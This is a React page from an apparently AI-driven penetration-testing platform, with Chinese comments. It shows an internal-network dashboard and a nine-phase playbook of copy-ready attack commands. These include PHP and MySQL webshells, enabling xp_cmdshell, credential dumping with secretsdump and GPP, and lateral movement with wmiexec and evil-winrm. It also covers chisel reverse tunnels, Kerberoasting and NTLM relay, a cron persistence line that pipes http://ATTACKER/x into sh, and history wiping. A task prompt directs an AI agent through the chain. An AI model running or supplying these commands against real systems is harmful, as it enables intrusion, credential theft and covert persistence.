"use client";

// ============================================================
// EXSALA HERMES MOD · powered by Gienetic
// 内网渗透（Internal Network Pentest）
//
// 这是一个【汇聚视图】，不引入新的后端表：
//   · 主机与网段：从资产库（/api/assets）里筛出私网 IP，按 /24 归组
//   · 凭据线索：资产自身的 auth / params / technologies 字段
//   · 横向发现：从发现列表里按关键词归拢（内网/横向/域/凭据/提权/隧道…）
//   · 作战手册：内网渗透 skill 的九阶段操作卡，命令可直接复制
// 目的：把"后渗透/横向"这条线从散落的资产和发现里拉出来，单独成一个工作台。
// ============================================================

import * as React from "react";

import {
  ArrowRightIcon,
  CheckIcon,
  ChevronRightIcon,
  ClipboardCopyIcon,
  CrosshairIcon,
  KeyRoundIcon,
  Loader2Icon,
  NetworkIcon,
  RadarIcon,
  RefreshCwIcon,
  RouteIcon,
  SearchIcon,
  ShieldAlertIcon,
  TerminalIcon,
} from "lucide-react";
import { toast } from "sonner";

import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { api } from "@/lib/api";
import type { Asset, Finding } from "@/lib/types";
import { cn } from "@/lib/utils";

// ── 私网 / 特殊网段判定 ──────────────────────────────────────
function ipv4(ip?: string): [number, number, number, number] | null {
  if (!ip) return null;
  const m = /^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/.exec(ip.trim());
  if (!m) return null;
  const parts = [Number(m[1]), Number(m[2]), Number(m[3]), Number(m[4])] as const;
  if (parts.some((n) => n < 0 || n > 255)) return null;
  return [parts[0], parts[1], parts[2], parts[3]];
}

// 内网判定覆盖：RFC1918 / 回环 / 链路本地（云 metadata）/ CGNAT / 容器常见段
function isInternalIP(ip?: string): boolean {
  const p = ipv4(ip);
  if (!p) return false;
  const [a, b] = p;
  if (a === 10) return true;
  if (a === 172 && b >= 16 && b <= 31) return true;
  if (a === 192 && b === 168) return true;
  if (a === 127) return true;
  if (a === 169 && b === 254) return true;
  if (a === 100 && b >= 64 && b <= 127) return true;
  return false;
}

function segment24(ip?: string): string {
  const p = ipv4(ip);
  if (!p) return "未知网段";
  return `${p[0]}.${p[1]}.${p[2]}.0/24`;
}

function segmentClass(ip?: string): string {
  const p = ipv4(ip);
  if (!p) return "";
  if (p[0] === 10) return "RFC1918 · 10/8";
  if (p[0] === 172) return "RFC1918 · 172.16/12";
  if (p[0] === 192) return "RFC1918 · 192.168/16";
  if (p[0] === 127) return "回环";
  if (p[0] === 169) return "链路本地 / 云 metadata";
  if (p[0] === 100) return "CGNAT";
  return "";
}

// 横向相关关键词：从发现与资产里归拢"后渗透"这条线
const LATERAL_KEYS = [
  "内网",
  "横向",
  "提权",
  "域",
  "kerberos",
  "kerberoast",
  "委派",
  "ad cs",
  "证书",
  "lsass",
  "凭据",
  "credential",
  "密码",
  "hash",
  "票据",
  "ticket",
  "rdp",
  "smb",
  "winrm",
  "ssh",
  "redis",
  "mysql",
  "mssql",
  "隧道",
  "tunnel",
  "代理",
  "proxy",
  "ssrf",
  "反序列化",
  "shell",
  "rce",
];

function lateralHit(text: string): boolean {
  const t = text.toLowerCase();
  return LATERAL_KEYS.some((k) => t.includes(k));
}

interface HostRow {
  ip: string;
  segment: string;
  segClass: string;
  ports: Set<number>;
  services: Set<string>;
  apps: Set<string>;
  tasks: Set<number>;
  hasAuth: boolean;
  lastSeen: string;
  assetIds: number[];
}

function buildHosts(assets: Asset[]): HostRow[] {
  const map = new Map<string, HostRow>();
  for (const a of assets) {
    const ip = a.ip?.trim();
    if (!ip || !isInternalIP(ip)) continue;
    const key = ip;
    let row = map.get(key);
    if (!row) {
      row = {
        ip,
        segment: segment24(ip),
        segClass: segmentClass(ip),
        ports: new Set<number>(),
        services: new Set<string>(),
        apps: new Set<string>(),
        tasks: new Set<number>(),
        hasAuth: false,
        lastSeen: a.last_seen ?? "",
        assetIds: [],
      };
      map.set(key, row);
    }
    if (typeof a.port === "number") row.ports.add(a.port);
    for (const p of a.open_ports ?? []) if (typeof p.port === "number") row.ports.add(p.port);
    if (a.service_name) row.services.add(a.service_name);
    if (a.service_type) row.services.add(a.service_type);
    if (a.app_name) row.apps.add(a.app_name);
    if (a.page_title) row.apps.add(a.page_title);
    for (const t of a.task_ids ?? []) row.tasks.add(t);
    if ((a.auth && a.auth.length > 0) || (a.params && a.params.length > 0)) row.hasAuth = true;
    if (a.last_seen && a.last_seen > row.lastSeen) row.lastSeen = a.last_seen;
    row.assetIds.push(a.id);
  }
  return [...map.values()].sort((x, y) => (x.ip < y.ip ? -1 : 1));
}

// ── 作战手册（对应 skill: 内网渗透）────────────────────────────
interface Phase {
  id: string;
  title: string;
  goal: string;
  cmds: { label: string; cmd: string }[];
  tip: string;
}

const PHASES: Phase[] = [
  {
    id: "foothold",
    title: "① 后台 → 系统权限",
    goal: "把 Web 后台/低权入口变成可执行命令的立足点",
    cmds: [
      { label: "确认是否已有命令执行", cmd: "id; whoami; hostname; ip a 2>/dev/null || ipconfig" },
      { label: "上传最小 webshell 验证解析", cmd: 'echo \'<?php echo "pwn:".php_uname(); ?>\' > shell.php && curl -s http://TARGET/shell.php' },
      { label: "MySQL 写文件提权", cmd: "UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/s.php'" },
      { label: "MSSQL 开 xp_cmdshell", cmd: "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;" },
    ],
    tip: "后台功能里最常被忽略的提权入口：备份/恢复、定时任务、插件上传、模板编辑、日志清理、证书导入。",
  },
  {
    id: "recon",
    title: "② 立足点测绘（我在哪）",
    goal: "拿到主机归属、网段、域、权限的底图",
    cmds: [
      {
        label: "Linux 本地测绘",
        cmd: "hostname;id;uname -a;ip a;ip route;cat /etc/resolv.conf;ss -antp | head -30;ps aux | head -20;cat /etc/hosts",
      },
      {
        label: "Windows 本地测绘",
        cmd: "whoami /all & systeminfo & ipconfig /all & route print & netstat -ano | findstr LISTENING & net user",
      },
      { label: "内网可达性（轻量，不装工具）", cmd: 'for i in $(seq 1 254); do timeout 0.3 bash -c "echo >/dev/tcp/10.0.0.$i/445" 2>/dev/null && echo "10.0.0.$i:445 open"; done' },
      { label: "有 shell 且可直连时再 nmap", cmd: "nmap -sT -Pn -p 22,80,443,445,1433,3306,3389,6379 --open 10.0.0.0/24" },
    ],
    tip: "容器出口是 fake-IP 代理时，端口扫描不可信——命令要在立足点上跑，或走 SSH 桥回 Kali。",
  },
  {
    id: "cred",
    title: "③ 凭据抓取",
    goal: "一组可用凭据常常比十条漏洞链更省时间",
    cmds: [
      { label: "Linux 找密钥与配置", cmd: 'find / -name "id_rsa*" -o -name "*.pem" -o -name "*.key" 2>/dev/null | head; ls -la ~/.ssh; cat ~/.bash_history | tail -50' },
      { label: "Windows 抓 SAM/LSA/缓存", cmd: "impacket-secretsdump DOMAIN/USER:PASS@TARGET" },
      { label: "GPP 明文密码", cmd: "impacket-Get-GPPPassword.py DOMAIN/USER:PASS@DC" },
      { label: "配置里的云 AK / DB 口令", cmd: "grep -rEi 'AKID|LTAI|aws_access|secret_key|password' /var/www /opt /etc --include='*.conf' --include='*.yml' 2>/dev/null | head -30" },
    ],
    tip: "拿到一组后立刻做复用矩阵：同一口令试 SSH/SMB/WinRM/RDP/MySQL/Redis/后台/CI。",
  },
  {
    id: "privesc",
    title: "④ 本机提权",
    goal: "从服务账号/Web 用户提到 root / SYSTEM",
    cmds: [
      { label: "Linux 速查", cmd: "sudo -l; find / -perm -4000 -type f 2>/dev/null; getcap -r / 2>/dev/null; cat /etc/crontab; ls -la /etc/cron.*; ls -la /var/run/docker.sock 2>/dev/null" },
      { label: "Windows 速查", cmd: "whoami /priv; whoami /groups; wmic service get name,pathname,startmode | findstr /i auto" },
    ],
    tip: "优先配置类提权（sudo/SUID/服务路径/凭据），内核 exp 最后用——容易把机器打崩。",
  },
  {
    id: "lateral",
    title: "⑤ 横向移动",
    goal: "用凭据滚雪球，而不是用载荷硬打",
    cmds: [
      { label: "凭据型（安静）", cmd: "impacket-wmiexec DOMAIN/USER:PASS@10.0.0.5 'whoami'" },
      { label: "WinRM", cmd: "evil-winrm -i 10.0.0.5 -u USER -p PASS" },
      { label: "批量找可读共享", cmd: "nxc smb 10.0.0.0/24 -u USER -p PASS --shares" },
      { label: "批量执行", cmd: "nxc smb 10.0.0.0/24 -u USER -p PASS -x 'whoami'" },
      { label: "票据复用", cmd: "export KRB5CCNAME=admin.ccache; impacket-psexec -k -no-pass 10.0.0.5" },
    ],
    tip: "每打下一台，先抓它的凭据、看它还有哪个网段——横向是多层网络，不是单层。",
  },
  {
    id: "tunnel",
    title: "⑥ 隧道与多层网络",
    goal: "让本机工具能访问只有立足点能到的内网",
    cmds: [
      { label: "单端口转发", cmd: "chisel client http://TARGET:8080/tunnel 9000:10.0.0.5:3306" },
      { label: "反向 socks", cmd: "# 攻击侧：chisel server -p 8080 --reverse --socks5\n# 目标侧：./chisel client ATTACKER:8080 R:socks" },
      { label: "SSH 动态代理", cmd: "ssh -D 1080 -N -f user@10.0.0.5 && curl --socks5 127.0.0.1:1080 http://10.0.1.9/" },
      { label: "proxychains 串工具", cmd: "proxychains4 -q nmap -sT -Pn -p 445 172.16.5.0/24" },
    ],
    tip: "代理下 nmap 只能用 -sT（全连接）。收尾时记得把隧道全关掉。",
  },
  {
    id: "domain",
    title: "⑦ 域环境",
    goal: "有 AD 就优先打域，一条链到域管",
    cmds: [
      { label: "枚举 + BloodHound", cmd: "nxc ldap DC -u USER -p PASS --bloodhound --collection All" },
      { label: "Kerberoasting", cmd: "impacket-GetUserSPNs.py DOMAIN/USER:PASS -dc-ip DC -request" },
      { label: "AS-REP Roasting", cmd: "impacket-GetNPUsers.py DOMAIN/ -dc-ip DC -usersfile users.txt -no-pass" },
      { label: "AD CS（一步到域管）", cmd: "certipy find -u USER@DOMAIN -p PASS -dc-ip DC -vulnerable" },
      { label: "NTLM relay", cmd: "impacket-ntlmrelayx -tf relay.txt -smb2support -i" },
    ],
    tip: "域控难打，先打有数据/共享/备份的服务器往往更快出货。",
  },
  {
    id: "persist",
    title: "⑧ 权限维持",
    goal: "留一个能撤的点，而不是留一堆后门",
    cmds: [
      { label: "Linux 计划任务", cmd: '(crontab -l 2>/dev/null; echo "*/10 * * * * /usr/bin/curl -s http://ATTACKER/x|sh") | crontab -' },
      { label: "Windows 计划任务", cmd: "schtasks /create /tn Updater /tr C:\\Users\\Public\\u.exe /sc minute /mo 15 /ru SYSTEM" },
    ],
    tip: "每留一个点，就在事实里写清位置与移除方式；验收后逐条撤除。",
  },
  {
    id: "wrap",
    title: "⑨ 收尾与报告",
    goal: "证据链 + 拓扑 + 可修复建议",
    cmds: [
      { label: "清自己留下的东西", cmd: "rm -f /tmp/*.py /tmp/*.sh; history -c" },
      { label: "核对链路", cmd: "# 入口漏洞 → 首个 shell → 提权 → 横向 → 最终权限，每步都要有命令与输出" },
    ],
    tip: "finding 里不要写明文密码/票据，写「凭据已获取，存放于 run 目录 xxx」。",
  },
];

const TASK_PROMPT = `目标：内网渗透与横向。

我已经有立足点（Web 后台/低权 shell/一组凭据），请按下面的顺序推进，每步先写回事实再进下一步：
1. 把当前立足点升级成可执行命令的 shell，并记录主机归属、网段、域、当前权限；
2. 做轻量内网可达性探测（优先在立足点上用 /dev/tcp 或 bash 循环，不要在容器里扫端口）；
3. 抓本机凭据（SSH 密钥、配置文件口令、云 AK、浏览器/凭据管理器、LSASS/SAM）；
4. 本机提权，优先配置类（sudo/SUID/服务路径/计划任务），内核 exp 最后用；
5. 用凭据横向，优先 wmiexec/WinRM/SSH，避免上一上来就投放载荷；
6. 需要访问只有立足点能到的内网时，用 chisel / ssh -D 建隧道，并记录隧道生命周期；
7. 有域环境就转域：Kerberoasting / AS-REP / 委派 / AD CS / NTLM relay；
8. 最后做权限维持（并写清移除方式）与证据链整理。

约束：只在授权范围内操作；破坏性动作（改 GPO、删账号、清日志）放到最后并先确认允许。`;

function fmtTime(ts?: string) {
  if (!ts) return "—";
  const d = new Date(ts);
  if (Number.isNaN(d.getTime())) return ts;
  return d.toLocaleString("zh-CN", { month: "2-digit", day: "2-digit", hour: "2-digit", minute: "2-digit" });
}

function CopyCmd({ label, cmd }: { label: string; cmd: string }) {
  const [done, setDone] = React.useState(false);
  const copy = async () => {
    try {
      await navigator.clipboard.writeText(cmd);
      setDone(true);
      toast.success("已复制");
      setTimeout(() => setDone(false), 1200);
    } catch {
      toast.error("复制失败，请手动选中");
    }
  };
  return (
    <button
      type="button"
      onClick={copy}
      className="group flex w-full items-start gap-2 rounded-md border border-border/60 bg-muted/30 px-3 py-2 text-left transition hover:bg-accent"
    >
      <span className="mt-0.5 shrink-0 text-muted-foreground">
        {done ? <CheckIcon className="size-3.5" /> : <ClipboardCopyIcon className="size-3.5" />}
      </span>
      <span className="min-w-0 flex-1">
        <span className="block text-[11px] text-muted-foreground">{label}</span>
        <span className="block truncate font-mono text-xs">{cmd}</span>
      </span>
    </button>
  );
}

export default function InternalPentestPage() {
  const [assets, setAssets] = React.useState<Asset[]>([]);
  const [findings, setFindings] = React.useState<Finding[]>([]);
  const [loading, setLoading] = React.useState(true);
  const [query, setQuery] = React.useState("");
  const [segFilter, setSegFilter] = React.useState<string>("");
  const [tab, setTab] = React.useState("overview");

  const load = React.useCallback(() => {
    setLoading(true);
    // 资产库服务端分页：抓几页够用（内网主机一般不会超过这个量级）
    const pages = [0, 500, 1000, 1500];
    Promise.all(pages.map((offset) => api.assets("", 500, offset).catch(() => ({ assets: [], total: 0 }))))
      .then((rs) => {
        const all: Asset[] = [];
        for (const r of rs) all.push(...(r.assets ?? []));
        setAssets(all);
      })
      .finally(() => setLoading(false));
    api
      .findings()
      .then((fs) => setFindings(fs ?? []))
      .catch(() => setFindings([]));
  }, []);

  React.useEffect(() => {
    load();
  }, [load]);

  const hosts = React.useMemo(() => buildHosts(assets), [assets]);

  const segments = React.useMemo(() => {
    const m = new Map<string, HostRow[]>();
    for (const h of hosts) {
      const list = m.get(h.segment) ?? [];
      list.push(h);
      m.set(h.segment, list);
    }
    return [...m.entries()]
      .map(([seg, list]) => ({
        seg,
        hosts: list,
        segClass: list[0]?.segClass ?? "",
        ports: new Set(list.flatMap((h) => [...h.ports])),
      }))
      .sort((a, b) => b.hosts.length - a.hosts.length);
  }, [hosts]);

  const lateralFindings = React.useMemo(
    () => findings.filter((f) => lateralHit(`${f.name ?? ""} ${f.vulnclass} ${f.summary ?? ""}`)),
    [findings],
  );

  const credAssets = React.useMemo(
    () => hosts.filter((h) => h.hasAuth),
    [hosts],
  );

  const filteredHosts = React.useMemo(() => {
    const q = query.trim().toLowerCase();
    return hosts.filter((h) => {
      if (segFilter && h.segment !== segFilter) return false;
      if (!q) return true;
      const hay = `${h.ip} ${h.segment} ${[...h.services].join(" ")} ${[...h.apps].join(" ")}`.toLowerCase();
      return hay.includes(q);
    });
  }, [hosts, query, segFilter]);

  const allPorts = React.useMemo(() => {
    const m = new Map<number, number>();
    for (const h of hosts) for (const p of h.ports) m.set(p, (m.get(p) ?? 0) + 1);
    return [...m.entries()].sort((a, b) => b[1] - a[1]).slice(0, 14);
  }, [hosts]);

  const segPrompt = segFilter ? `\n优先目标网段：${segFilter}` : "";

  return (
    <div className="flex flex-col gap-4">
      {/* 顶部标题栏 */}
      <div className="flex flex-wrap items-center justify-between gap-3">
        <div className="flex items-center gap-2">
          <CrosshairIcon className="size-5" />
          <h1 className="text-lg font-semibold">内网渗透</h1>
          <Badge variant="secondary" className="text-[10px]">
            后渗透 · 横向移动工作台
          </Badge>
        </div>
        <div className="flex items-center gap-2">
          <Button
            variant="outline"
            size="sm"
            onClick={async () => {
              try {
                await navigator.clipboard.writeText(TASK_PROMPT + segPrompt);
                toast.success("已复制内网渗透任务提示词，粘到「任务 → 新建任务」即可");
              } catch {
                toast.error("复制失败");
              }
            }}
          >
            <TerminalIcon className="size-3.5" />
            复制内网渗透任务提示词
          </Button>
          <Button variant="outline" size="sm" onClick={load} disabled={loading}>
            {loading ? <Loader2Icon className="size-3.5 animate-spin" /> : <RefreshCwIcon className="size-3.5" />}
            刷新
          </Button>
        </div>
      </div>

      {/* 概览卡 */}
      <div className="grid grid-cols-2 gap-3 md:grid-cols-5">
        {[
          { label: "内网主机", value: hosts.length, icon: NetworkIcon, hint: "私网 IP 去重" },
          { label: "内网网段", value: segments.length, icon: RouteIcon, hint: "按 /24 归组" },
          { label: "有凭据线索", value: credAssets.length, icon: KeyRoundIcon, hint: "带 auth/params 的资产" },
          { label: "横向相关发现", value: lateralFindings.length, icon: ShieldAlertIcon, hint: "关键词归拢" },
          { label: "开放端口种类", value: allPorts.length, icon: RadarIcon, hint: "内网主机上见到的" },
        ].map((c) => (
          <Card key={c.label} className="gap-1 p-3">
            <div className="flex items-center justify-between">
              <span className="text-xs text-muted-foreground">{c.label}</span>
              <c.icon className="size-4" />
            </div>
            <div className="text-2xl font-semibold tabular-nums">{c.value}</div>
            <div className="text-[10px] text-muted-foreground">{c.hint}</div>
          </Card>
        ))}
      </div>

      <Tabs value={tab} onValueChange={setTab} className="gap-3">
        <TabsList>
          <TabsTrigger value="overview">概览</TabsTrigger>
          <TabsTrigger value="hosts">内网主机</TabsTrigger>
          <TabsTrigger value="segments">网段</TabsTrigger>
          <TabsTrigger value="creds">凭据与横向</TabsTrigger>
          <TabsTrigger value="playbook">作战手册</TabsTrigger>
        </TabsList>

        {/* ── 概览 ── */}
        <TabsContent value="overview" className="flex flex-col gap-3">
          <Card className="p-4">
            <div className="mb-2 flex items-center gap-2 text-sm font-medium">
              <RadarIcon className="size-4" />
              端口画像（内网主机上出现次数最多的）
            </div>
            {allPorts.length === 0 ? (
              <p className="text-xs text-muted-foreground">
                还没有内网资产。跑一个任务并把目标网段加入范围后，这里会自动汇总。
              </p>
            ) : (
              <div className="flex flex-wrap gap-2">
                {allPorts.map(([port, n]) => (
                  <Badge key={port} variant="outline" className="font-mono text-[11px]">
                    :{port}
                    <span className="ml-1 text-muted-foreground">×{n}</span>
                  </Badge>
                ))}
              </div>
            )}
          </Card>

          <Card className="p-4">
            <div className="mb-2 flex items-center gap-2 text-sm font-medium">
              <RouteIcon className="size-4" />
              网段速览
            </div>
            {segments.length === 0 ? (
              <p className="text-xs text-muted-foreground">暂无内网网段。</p>
            ) : (
              <div className="flex flex-col divide-y divide-border/60">
                {segments.slice(0, 8).map((s) => (
                  <button
                    key={s.seg}
                    type="button"
                    onClick={() => {
                      setSegFilter(s.seg);
                      setTab("hosts");
                    }}
                    className="flex items-center justify-between gap-3 py-2 text-left hover:bg-accent/50"
                  >
                    <span className="flex min-w-0 items-center gap-2">
                      <span className="font-mono text-xs">{s.seg}</span>
                      <span className="truncate text-[11px] text-muted-foreground">{s.segClass}</span>
                    </span>
                    <span className="flex shrink-0 items-center gap-2 text-xs text-muted-foreground">
                      {s.hosts.length} 主机 · {s.ports.size} 端口
                      <ChevronRightIcon className="size-3.5" />
                    </span>
                  </button>
                ))}
              </div>
            )}
          </Card>
        </TabsContent>

        {/* ── 内网主机 ── */}
        <TabsContent value="hosts">
          <Card className="overflow-hidden py-0">
            <div className="flex flex-wrap items-center gap-2 border-b border-border/60 p-3">
              <div className="relative">
                <SearchIcon className="pointer-events-none absolute left-2 top-1/2 size-3.5 -translate-y-1/2 text-muted-foreground" />
                <Input
                  value={query}
                  onChange={(e) => setQuery(e.target.value)}
                  placeholder="搜 IP / 服务 / 应用"
                  className="h-8 w-56 pl-7 text-xs"
                />
              </div>
              <Badge variant={segFilter ? "default" : "outline"} className="cursor-pointer text-[11px]" onClick={() => setSegFilter("")}>
                {segFilter || "全部网段"}
              </Badge>
              <span className="ml-auto text-xs text-muted-foreground">{filteredHosts.length} 台</span>
            </div>
            <div className="max-h-[calc(100vh-24rem)] overflow-auto">
              <Table>
                <TableHeader className="sticky top-0 z-10 bg-card">
                  <TableRow>
                    <TableHead className="w-[130px]">IP</TableHead>
                    <TableHead className="w-[130px]">网段</TableHead>
                    <TableHead className="w-[220px]">开放端口</TableHead>
                    <TableHead>服务 / 应用</TableHead>
                    <TableHead className="w-[90px]">凭据</TableHead>
                    <TableHead className="w-[110px]">最近出现</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {loading && hosts.length === 0 ? (
                    <TableRow>
                      <TableCell colSpan={6} className="py-12 text-center">
                        <Loader2Icon className="mx-auto size-5 animate-spin text-muted-foreground" />
                      </TableCell>
                    </TableRow>
                  ) : filteredHosts.length === 0 ? (
                    <TableRow>
                      <TableCell colSpan={6} className="py-12 text-center text-sm text-muted-foreground">
                        没有匹配的内网主机
                      </TableCell>
                    </TableRow>
                  ) : (
                    filteredHosts.map((h) => (
                      <TableRow key={h.ip}>
                        <TableCell className="font-mono text-xs">{h.ip}</TableCell>
                        <TableCell>
                          <button
                            type="button"
                            className="font-mono text-xs text-muted-foreground hover:underline"
                            onClick={() => setSegFilter(h.segment)}
                          >
                            {h.segment}
                          </button>
                        </TableCell>
                        <TableCell>
                          <div className="flex flex-wrap gap-1">
                            {[...h.ports].sort((a, b) => a - b).slice(0, 10).map((p) => (
                              <Badge key={p} variant="outline" className="font-mono text-[10px]">
                                {p}
                              </Badge>
                            ))}
                            {h.ports.size > 10 && (
                              <span className="text-[10px] text-muted-foreground">+{h.ports.size - 10}</span>
                            )}
                            {h.ports.size === 0 && <span className="text-[11px] text-muted-foreground">—</span>}
                          </div>
                        </TableCell>
                        <TableCell className="max-w-[320px]">
                          <div className="truncate text-xs">{[...h.services, ...h.apps].join(" · ") || "—"}</div>
                        </TableCell>
                        <TableCell>
                          {h.hasAuth ? (
                            <Badge variant="secondary" className="text-[10px]">
                              有线索
                            </Badge>
                          ) : (
                            <span className="text-[11px] text-muted-foreground">—</span>
                          )}
                        </TableCell>
                        <TableCell className="text-[11px] text-muted-foreground">{fmtTime(h.lastSeen)}</TableCell>
                      </TableRow>
                    ))
                  )}
                </TableBody>
              </Table>
            </div>
          </Card>
        </TabsContent>

        {/* ── 网段 ── */}
        <TabsContent value="segments" className="grid gap-3 md:grid-cols-2">
          {segments.length === 0 ? (
            <Card className="p-6 text-center text-sm text-muted-foreground">暂无内网网段</Card>
          ) : (
            segments.map((s) => (
              <Card key={s.seg} className="p-4">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <RouteIcon className="size-4" />
                    <span className="font-mono text-sm">{s.seg}</span>
                  </div>
                  <Badge variant="outline" className="text-[10px]">
                    {s.segClass}
                  </Badge>
                </div>
                <div className="mt-2 flex flex-wrap gap-1">
                  {s.hosts.slice(0, 16).map((h) => (
                    <Badge key={h.ip} variant="secondary" className="font-mono text-[10px]">
                      {h.ip}
                    </Badge>
                  ))}
                  {s.hosts.length > 16 && (
                    <span className="text-[10px] text-muted-foreground">+{s.hosts.length - 16}</span>
                  )}
                </div>
                <div className="mt-3 flex items-center justify-between text-[11px] text-muted-foreground">
                  <span>
                    {s.hosts.length} 主机 · {s.ports.size} 端口
                  </span>
                  <button
                    type="button"
                    className="flex items-center gap-1 hover:underline"
                    onClick={() => {
                      setSegFilter(s.seg);
                      setTab("hosts");
                    }}
                  >
                    查看主机 <ArrowRightIcon className="size-3" />
                  </button>
                </div>
              </Card>
            ))
          )}
        </TabsContent>

        {/* ── 凭据与横向发现 ── */}
        <TabsContent value="creds" className="flex flex-col gap-3">
          <Card className="p-4">
            <div className="mb-2 flex items-center gap-2 text-sm font-medium">
              <KeyRoundIcon className="size-4" />
              凭据线索主机（{credAssets.length}）
            </div>
            {credAssets.length === 0 ? (
              <p className="text-xs text-muted-foreground">
                还没有带认证信息的资产。worker 记录到登录入口/凭据后会自动出现在这里。
              </p>
            ) : (
              <div className="flex flex-wrap gap-1">
                {credAssets.map((h) => (
                  <Badge key={h.ip} variant="outline" className="font-mono text-[10px]">
                    {h.ip}
                    {[...h.ports].length > 0 && <span className="ml-1 text-muted-foreground">:{[...h.ports][0]}</span>}
                  </Badge>
                ))}
              </div>
            )}
          </Card>

          <Card className="overflow-hidden py-0">
            <div className="border-b border-border/60 p-3 text-sm font-medium">
              横向 / 后渗透相关发现（{lateralFindings.length}）
            </div>
            <div className="max-h-[calc(100vh-26rem)] overflow-auto">
              <Table>
                <TableHeader className="sticky top-0 z-10 bg-card">
                  <TableRow>
                    <TableHead className="w-[90px]">等级</TableHead>
                    <TableHead className="w-[180px]">类型</TableHead>
                    <TableHead>摘要</TableHead>
                    <TableHead className="w-[110px]">任务</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {lateralFindings.length === 0 ? (
                    <TableRow>
                      <TableCell colSpan={4} className="py-10 text-center text-sm text-muted-foreground">
                        还没有横向相关发现
                      </TableCell>
                    </TableRow>
                  ) : (
                    lateralFindings.map((f) => (
                      <TableRow key={f.id}>
                        <TableCell>
                          <Badge
                            variant={f.severity === "critical" || f.severity === "high" ? "default" : "secondary"}
                            className="text-[10px] uppercase"
                          >
                            {f.severity ?? "info"}
                          </Badge>
                        </TableCell>
                        <TableCell className="max-w-[180px] truncate text-xs">{f.name || f.vulnclass}</TableCell>
                        <TableCell className="max-w-[520px]">
                          <div className="truncate text-xs text-muted-foreground">{f.summary}</div>
                        </TableCell>
                        <TableCell className="font-mono text-[11px] text-muted-foreground">#{f.task_id ?? "—"}</TableCell>
                      </TableRow>
                    ))
                  )}
                </TableBody>
              </Table>
            </div>
          </Card>
        </TabsContent>

        {/* ── 作战手册 ── */}
        <TabsContent value="playbook" className="flex flex-col gap-3">
          <Card className="p-4">
            <p className="text-xs text-muted-foreground">
              这套流程与内置技能 <span className="font-mono">内网渗透</span> 同源（目录
              <span className="font-mono"> internal-network-pentest</span>）。命令点一下即复制，可直接贴进终端。
            </p>
          </Card>
          {PHASES.map((p) => (
            <Card key={p.id} className="p-4">
              <div className="flex items-start justify-between gap-3">
                <div>
                  <div className="text-sm font-medium">{p.title}</div>
                  <div className="text-[11px] text-muted-foreground">{p.goal}</div>
                </div>
                <Badge variant="outline" className="shrink-0 text-[10px]">
                  {p.cmds.length} 条命令
                </Badge>
              </div>
              <div className="mt-3 flex flex-col gap-2">
                {p.cmds.map((c) => (
                  <CopyCmd key={`${p.id}-${c.label}`} label={c.label} cmd={c.cmd} />
                ))}
              </div>
              <p className={cn("mt-3 rounded-md bg-muted/40 px-3 py-2 text-[11px] text-muted-foreground")}>{p.tip}</p>
            </Card>
          ))}
        </TabsContent>
      </Tabs>
    </div>
  );
}
